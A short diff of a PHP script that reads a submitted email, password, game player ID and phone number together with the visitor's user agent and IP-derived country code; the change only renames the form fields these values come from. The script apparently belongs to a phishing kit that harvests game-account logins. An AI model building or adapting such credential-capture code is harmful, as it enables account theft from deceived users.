@@ -7,10 +7,10 @@ $times = date("g:i a");
 $code = $_SESSION['ip_countryCode'] = clientData('code');
 $country = strtolower($code);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
-$email = $_POST['email'];
-$password = $_POST['password'];
-$playid = $_POST['playid'];
-$phone = $_POST['phone'];
+$email = $_POST['user'];
+$password = $_POST['pass'];
+$playid = $_POST['ip'];
+$phone = $_POST['ua'];
 $login = $_POST['login'];
 
 
